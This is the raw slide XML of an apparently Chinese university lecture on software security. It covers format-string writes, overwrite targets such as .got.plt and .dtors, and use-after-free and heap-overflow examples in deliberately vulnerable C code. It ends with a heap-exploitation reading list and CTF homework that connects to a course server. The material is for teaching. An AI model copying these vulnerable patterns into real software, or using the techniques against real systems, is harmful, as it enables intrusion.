              </a:rPr>
              <a:t>%8$</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>hn"'</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>You Win!</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF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99233" y="3113028"/>
            <a:ext cx="2515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 smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>How to Execute Arbitrary Code?</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN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46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Where to write?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ret address</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>.got.plt</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>.dtors</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>readelf -s a.out |grep DTOR</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800"/>
              <a:t>    29: 08049518     0 OBJECT  LOCAL  DEFAULT   19 __DTOR_LIST__</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:buFontTx/>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US" sz="1800"/>
              <a:t>    56: 0804951c     0 OBJECT  GLOBAL HIDDEN   19 __DTOR_END__</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>__atexit</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="zh-CN" altLang="en-US"/>
              <a:t>...you name it</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="341760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7279" y="24192"/>
            <a:ext cx="7209363" cy="682135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struct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{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char name[32];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;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};</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pP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struct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*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;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char *service;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pP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main(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argc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, char **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argv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{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char line[128];</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRP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while(1) {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printf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("[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= %p, service = %p ]\n",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, service)</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>;</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRP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if(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fgets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(line,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sizeof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(line),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stdin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) == NULL) break;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if(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strncmp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(line, "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", 5) == 0) {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=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malloc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sizeof</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1400" dirty="0" smtClean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400" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>struct</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1400" dirty="0" err="1" smtClean="0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));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memset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, 0,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sizeof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));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    if(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strlen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(line + 5) &lt; 31) {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   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strcpy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-&gt;name, line + 5);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    }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}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if(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strncmp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(line, "reset", 5) == 0) {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    free(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);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}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if(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strncmp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(line, "service", 6) == 0) {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    service =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strdup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(line + 7);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}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if(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strncmp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(line, "login", 5) == 0) {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    if(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-&gt;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auth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) {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   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printf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("you have logged in already!\n");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    } else {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        </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1400" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>printf</a:t>
            </a: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("please enter your password\n");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    }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    }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  }</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="1400" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="1400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consola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83672" y="249042"/>
            <a:ext cx="2515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 smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FFFF00"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Can you find the bug?</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN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18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释放后使用（</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>Use After Free</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0" smtClean="0"/>
              <a:t>）</a:t>
            </a:r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394558" y="2565135"/>
            <a:ext cx="1431911" cy="8716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32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698068" y="2565135"/>
            <a:ext cx="1992223" cy="8716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48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826469" y="2565135"/>
            <a:ext cx="871599" cy="8716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16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690291" y="2565135"/>
            <a:ext cx="1431911" cy="87164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32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568878" y="1462654"/>
            <a:ext cx="574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err="1" smtClean="0"/>
              <a:t>malloc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(32);</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>malloc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(16);</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>malloc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(48);</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>malloc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(32)</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2400" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="11" name="直线箭头连接符 10"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="3" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2110514" y="1924319"/>
            <a:ext cx="0" cy="6408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线箭头连接符 13"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="6" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="3262269" y="1924319"/>
            <a:ext cx="149416" cy="6408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线箭头连接符 15"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="5" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1">
            <a:off x="4694180" y="1924319"/>
            <a:ext cx="124513" cy="6408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>
            <a:endCxn id="7" idx="0"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6225702" y="1924319"/>
            <a:ext cx="180545" cy="6408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215446" y="4665077"/>
            <a:ext cx="8596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err="1" smtClean="0"/>
              <a:t>ptr</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>malloc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(32);</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>malloc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(16);</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>malloc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(48);free(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>ptr</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>);</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>buf</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0"/>
              <a:t>malloc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0"/>
              <a:t>(32)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ptr</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>-&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>func</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2400" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>()</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" sz="2400" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FF0000"/>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:cxnSp>
        <p:nvCxnSpPr>
          <p:cNvPr id="26" name="直线箭头连接符 25"/>
          <p:cNvCxnSpPr>
            <a:endCxn id="3" idx="2"/>
          </p:cNvCxnSpPr>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="2110514" y="3436783"/>
            <a:ext cx="305058" cy="12282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线箭头连接符 28"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="3192294" y="3436783"/>
            <a:ext cx="319002" cy="12444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线箭头连接符 29"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="4599302" y="3436783"/>
            <a:ext cx="438782" cy="12444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线箭头连接符 30"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="2415572" y="3561305"/>
            <a:ext cx="5603132" cy="12078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694179" y="6127576"/>
            <a:ext cx="3872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control </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>func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en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>ptr</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:sym typeface="Wingdings"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Control the </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
              </a:rPr>
              <a:t>buffer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9" name="直线箭头连接符 38"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipV="1">
            <a:off x="7308975" y="5155174"/>
            <a:ext cx="0" cy="972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线箭头连接符 42"/>
          <p:cNvCxnSpPr/>
          <p:nvPr/>
        </p:nvCxnSpPr>
        <p:spPr>
          <a:xfrm flipH="1" flipV="1">
            <a:off x="2110515" y="5496074"/>
            <a:ext cx="3393006" cy="6315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14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堆溢出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08175" y="1531610"/>
            <a:ext cx="6014028" cy="175432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#define BUFSIZE 256</a:t>
            </a:r>
          </a:p>
          <a:p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main(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int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argc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, char **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argv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) {</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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char *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;</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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 = (</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>char*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)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malloc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sizeof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(char)*BUFSIZE);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/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strcpy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(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buf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, </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>argv</a:t>
            </a:r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[1]);</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="00FF00"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>}</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="zh-CN" altLang="en-US" dirty="0">
              <a:solidFill>
                <a:srgbClr val="00FF00"/>
              </a:solidFill>
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consola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08175" y="4009580"/>
            <a:ext cx="612609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 smtClean="0"/>
              <a:t>堆溢出利用参考文献：</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>Vudo</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1"/>
              <a:t>Malloc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Tricks, 2001</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>Once Upon A free(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>), 2001</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>The </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" err="1"/>
              <a:t>Malloc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 smtClean="0"/>
              <a:t>Maleficarum</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>, 2005</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="285750" indent="-285750">
              <a:buFont typeface="Arial"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0"/>
              <a:t>MALLOC DES-</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" sz="2000" dirty="0" smtClean="0"/>
              <a:t>MALEFICARUM, 2009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9291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作业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 err="1" smtClean="0"/>
              <a:t>recho</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>recho</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>recho.c</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>/libc.so.6</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> 166.111.132.132 1234</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>/home/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>recho</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>/flag</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>weapon_shop</a:t>
            </a:r>
            <a:endParaRPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>weapon_shop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IDA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6.6</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>nc</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t> 166.111.132.132 7563 </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>/home/</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" err="1" smtClean="0"/>
              <a:t>weapon_shop</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="1" lang="en-US" altLang="zh-CN" dirty="0" smtClean="0"/>
              <a:t>/flag</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="383889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5972</TotalTime>
  <Words>2730</Words>
  <Application>Microsoft Macintosh PowerPoint</Application>
  <PresentationFormat>On-screen Show (4:3)</PresentationFormat>
  <Paragraphs>667</Paragraphs>
  <Slides>53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9" baseType="lpstr">
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Arial Narrow</vt:lpstr>
      <vt:lpstr>Calibri</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>Courier</vt:lpstr>
      <vt:lpstr>Courier New</vt:lpstr>
      <vt:lpstr>Courier New Bold</vt:lpstr>
      <vt:lpstr>Lucida Console</vt:lpstr>
      <vt:lpstr>Menlo Regular</vt:lpstr>
      <vt:lpstr>Tahoma</vt:lpstr>
      <vt:lpstr>Times-Roman</vt:lpstr>
      <vt:lpstr>Verdana</vt:lpstr>
      <vt:lpstr>Wingdings</vt:lpstr>
      <vt:lpstr>宋体</vt:lpstr>
      <vt:lpstr>新細明體</vt:lpstr>
      <vt:lpstr>Office 主题</vt:lpstr>
      <vt:lpstr>软件安全</vt:lpstr>
      <vt:lpstr>什么是软件安全？</vt:lpstr>
      <vt:lpstr>软件漏洞的分类</vt:lpstr>
      <vt:lpstr>内存破坏漏洞危害</vt:lpstr>
      <vt:lpstr>如何理解漏洞并利用</vt:lpstr>
      <vt:lpstr>从C语言到可执行文件</vt:lpstr>
      <vt:lpstr>编译与链接</vt:lpstr>
      <vt:lpstr>编译：从C语言到汇编</vt:lpstr>
